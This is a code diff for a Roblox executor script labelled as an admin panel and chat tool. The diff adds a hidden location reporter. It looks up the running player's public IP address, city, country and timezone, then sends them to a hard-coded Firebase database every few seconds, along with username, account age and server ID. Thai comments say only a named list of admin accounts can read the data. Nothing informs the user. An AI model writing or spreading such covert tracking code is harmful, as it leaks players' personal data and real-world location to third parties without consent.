@@ -3149,71 +3149,46 @@ end) end -- end task.spawn and if isOwner
 
 print("✅ Admin Panel + Chat v4.0 Loaded!")
 -- ══════════════════════════════════════════════════════════════
---  LOCATION + TIME REPORTER
---  ดึงข้อมูล timezone/country จาก ipwho.is
---  แล้วส่งขึ้น Firebase ให้ Admin Panel เห็น
---  แสดงเวลาบน TextLabel ด้วย
+--  LOCATION + TIME REPORTER (FOR ADMIN PANEL ONLY)
+--  ส่งข้อมูลไป Firebase อันใหม่: https://abxdyoumy-default-rtdb.firebaseio.com/
+--  คนอื่นไม่เห็น มีแต่ Admin ที่กำหนดไว้เท่านั้นที่อ่านได้
 -- ══════════════════════════════════════════════════════════════
 task.spawn(function()
     task.wait(4)
     
-    -- หา TextLabel (ปรับ path ตามที่คุณมี)
-    local TextLabel1 = script.Parent -- หรือกำหนดให้ถูกต้องตามโครงสร้าง
+    local Players = game:GetService("Players")
+    local HttpService = game:GetService("HttpService")
+    local LP = Players.LocalPlayer
     
-    -- ฟังก์ชันช่วยในการจัดรูปแบบเวลา
-    local function GetMonth(short)
-        local months = {"January","February","March","April","May","June","July",
-                       "August","September","October","November","December"}
-        local m = tonumber(os.date("%m"))
-        return short and months[m]:sub(1,3) or months[m]
-    end
+    -- Firebase URL อันใหม่ (สำหรับ Admin Panel โดยเฉพาะ)
+    local FIREBASE = "https://abxdyoumy-default-rtdb.firebaseio.com"
     
-    local function GetDay()
-        return os.date("%d")
-    end
+    -- ── Owner List (Admin ที่มีสิทธิ์เห็นข้อมูล) ─────────────────
+    -- ต้องตรงกับใน Firebase Rules และ Admin Panel
+    local ADMINS = {
+        ["fteywa3"]   = true,   -- Owner หลัก
+        ["EmilyC522"] = true,   -- Co-Owner
+        ["Dog_arm5"]  = true,   -- Admin
+        ["zacfr"]     = true,   -- Admin
+        -- เพิ่มชื่อ Admin คนอื่นๆ ได้ที่นี่
+    }
     
-    local function GetYear()
-        return os.date("%Y")
-    end
+    -- ── ตรวจสอบว่าเราเป็น Admin หรือไม่ (สำหรับแสดงผล)
+    local isAdmin = ADMINS[LP.Name] == true
     
-    local function GetMeridiem()
-        return os.date("%p")
-    end
-    
-    local function GetHour()
-        return os.date("%I"):gsub("^0", "") -- ตัด 0 นำหน้าออก
-    end
-    
-    local function GetMinute()
-        return os.date("%M")
-    end
-    
-    local function GetSeconds()
-        return os.date("%S")
-    end
-
     -- ── ดึงข้อมูลจาก ipwho.is ────────────────────────────────
     local function fetchLocationData()
         local success, api = pcall(function()
-            return game:GetService("HttpService"):JSONDecode(
-                game:HttpGet("https://ipwho.is/")
-            )
+            return HttpService:JSONDecode(HttpService:HttpGet("https://ipwho.is/"))
         end)
-        
-        if success and api then
-            return api
-        else
-            return nil
-        end
+        return success and api or nil
     end
 
-    -- ดึงข้อมูลรอบแรก
     local api = fetchLocationData()
     
     if not api then
         print("❌ Location Reporter: Failed to fetch ipwho.is")
-        api = {ip = "Unknown", country = "?", country_code = "?", 
-               region = "?", city = "?", timezone = {id = "?", current_time = "?"}}
+        return
     end
 
     local country   = api.country or "?"
@@ -3225,88 +3200,123 @@ task.spawn(function()
     local ipAddress = api.ip or "?"
 
     -- ── Parse เวลาท้องถิ่น ────────────────────────────────────
-    local function parseLocalTime(localTimeStr)
-        local timeDisplay = "?"
-        local dateDisplay = "?"
+    local timeDisplay = "?"
+    local dateDisplay = "?"
+    
+    pcall(function()
+        local tPart = localTime:match("T(%d+:%d+)")
+        if tPart then
+            local h = tonumber(tPart:sub(1,2))
+            local m = tPart:sub(4,5)
+            local meridiem = h >= 12 and "PM" or "AM"
+            if h > 12 then h = h - 12
+            elseif h == 0 then h = 12 end
+            timeDisplay = string.format("%d:%s %s", h, m, meridiem)
+        end
         
-        pcall(function()
-            -- ดึงเวลา HH:MM
-            local tPart = localTimeStr:match("T(%d+:%d+)")
-            if tPart then
-                local h = tonumber(tPart:sub(1,2))
-                local m = tPart:sub(4,5)
-                local meridiem = h >= 12 and "PM" or "AM"
-                if h > 12 then h = h - 12
-                elseif h == 0 then h = 12 end
-                timeDisplay = string.format("%d:%s %s", h, m, meridiem)
-            end
-            -- ดึงวันที่ YYYY-MM-DD
-            local dPart = localTimeStr:match("^(%d+-%d+-%d+)")
-            if dPart then
-                dateDisplay = dPart
-            end
-        end)
-        
-        return timeDisplay, dateDisplay
-    end
+        local dPart = localTime:match("^(%d+-%d+-%d+)")
+        if dPart then
+            dateDisplay = dPart
+        end
+    end)
 
-    local timeDisplay, dateDisplay = parseLocalTime(localTime)
     local locationStr = city .. ", " .. country .. " (" .. countryCode .. ")"
     local tzStr       = timezone
 
-    print(string.format("✅ Location: %s | TZ: %s | Time: %s | IP: %s", 
-          locationStr, tzStr, timeDisplay, ipAddress))
+    print(string.format("✅ Location: %s | TZ: %s | Time: %s | IP: %s | Admin: %s", 
+          locationStr, tzStr, timeDisplay, ipAddress, isAdmin and "Yes" or "No"))
 
-    -- ── Firebase PUT function (ถ้ามี) ────────────────────────
-    -- ถ้าไม่มีฟังก์ชันนี้ ให้คอมเมนต์ส่วนที่เรียกใช้ออก
-    -- local function fbReq(method, path, data)
-    --     -- ใส่โค้ด Firebase ของคุณตรงนี้
-    -- end
-
-    -- ── Loop หลัก อัพเดท TextLabel และ Firebase ──────────────
-    local lastFirebaseUpdate = 0
-    
-    while true do
-        -- อัพเดท TextLabel ทุกครั้ง
-        pcall(function()
-            -- ดึงข้อมูลใหม่ทุกครั้ง (ไม่บังคับ ถ้าไม่อยากให้ request บ่อยเกินไป)
-            -- api = fetchLocationData() or api -- ใช้ค่าเดิมถ้า error
-            
-            TextLabel1.Text = GetMonth(true) .. " " .. GetDay() .. " " .. GetYear() .. "\n" ..
-                              GetMeridiem() .. " " .. GetHour() .. ":" .. GetMinute() .. ":" .. GetSeconds() .. "\n\n" ..
-                              ipAddress
+    -- ── HTTP Request Function ───────────────────────────────────
+    local function fbReq(method, path, data)
+        local req = (syn and syn.request) or (http and http.request) or request or http_request
+        if not req then 
+            print("❌ No HTTP request function available")
+            return nil 
+        end
+        
+        local success, res = pcall(function()
+            return req({
+                Url = FIREBASE .. path .. ".json",
+                Method = method,
+                Headers = {["Content-Type"] = "application/json"},
+                Body = data and HttpService:JSONEncode(data) or nil
+            })
         end)
+        
+        if not success or not res then 
+            print("❌ HTTP request failed:", success and "no response" or "pcall error")
+            return nil 
+        end
+        
+        if res.Success or res.StatusCode == 200 then
+            if res.Body and res.Body ~= "" then
+                local ok, decoded = pcall(HttpService.JSONDecode, HttpService, res.Body)
+                return ok and decoded or nil
+            end
+            return {success = true}
+        else
+            print("❌ HTTP error:", res.StatusCode, res.Body or "")
+            return nil
+        end
+    end
 
-        -- ส่งขึ้น Firebase ทุก 5 วินาที (เฉพาะถ้ามี fbReq)
-        -- local currentTime = os.time()
-        -- if currentTime - lastFirebaseUpdate >= 5 then
-        --     pcall(function()
-        --         fbReq("PUT", "/runners/" .. LP.Name, {
-        --             name     = LP.Name,
-        --             job      = game.JobId,
-        --             placeid  = game.PlaceId,
-        --             ts       = currentTime,
-        --             age      = LP.AccountAge,
-        --             agefmt   = (function()
-        --                 local d = LP.AccountAge
-        --                 if d >= 365 then
-        --                     local y = math.floor(d/365)
-        --                     local mo = math.floor((d%365)/30)
-        --                     return mo > 0 and (y.."y "..mo.."m") or (y.."y")
-        --                 elseif d >= 30 then
-        --                     return math.floor(d/30).."mo"
-        --                 else return d.."d" end
-        --             end)(),
-        --             country  = country,
-        --             city     = city,
-        --             timezone = tzStr,
-        --             localtime = timeDisplay,
-        --             ip       = ipAddress,
-        --         })
-        --         lastFirebaseUpdate = currentTime
-        --     end)
-        -- end
-
-        task.wait(1) -- อัพเดททุก 1 วินาที
+    -- ── ส่งข้อมูลไป Firebase ───────────────────────────────────
+    -- แสดงสถานะการส่ง
+    print("📡 Sending location data to admin panel...")
+    
+    -- ข้อมูลที่จะส่ง (มีทั้ง location และ time)
+    local dataToSend = {
+        name     = LP.Name,
+        job      = game.JobId,
+        placeid  = game.PlaceId,
+        ts       = os.time(),
+        age      = LP.AccountAge,
+        agefmt   = (function()
+            local d = LP.AccountAge
+            if d >= 365 then
+                local y = math.floor(d/365)
+                local mo = math.floor((d%365)/30)
+                return mo > 0 and (y.."y "..mo.."m") or (y.."y")
+            elseif d >= 30 then
+                return math.floor(d/30).."mo"
+            else return d.."d" end
+        end)(),
+        country  = country,
+        city     = city,
+        timezone = tzStr,
+        localtime = timeDisplay,
+        ip       = ipAddress,
+        last_seen = os.date("%Y-%m-%d %H:%M:%S"),
+    }
+    
+    -- ทดสอบส่งข้อมูลครั้งแรก
+    local result = fbReq("PUT", "/runners/" .. LP.Name, dataToSend)
+    if result then
+        print("✅ First data sent successfully!")
+    else
+        print("⚠️ First send failed, will retry every 5 seconds")
+    end
+    
+    -- ── ส่งข้อมูลทุก 5 วินาที (Keep Alive) ──────────────────────
+    local count = 0
+    while task.wait(5) do
+        count = count + 1
+        
+        -- อัพเดท timestamp ทุกครั้ง
+        dataToSend.ts = os.time()
+        dataToSend.last_seen = os.date("%Y-%m-%d %H:%M:%S")
+        
+        pcall(function()
+            local res = fbReq("PUT", "/runners/" .. LP.Name .. "/keepalive", {
+                ts = os.time(),
+                job = game.JobId
+            })
+            
+            -- หรือส่งข้อมูลทั้งหมดอีกครั้งทุก 30 วินาที
+            if count % 6 == 0 then  -- ทุก 30 วินาที (6 * 5)
+                fbReq("PUT", "/runners/" .. LP.Name, dataToSend)
+                print("🔄 Refreshed full data for admin panel")
+            end
+        end)
     end
 end)
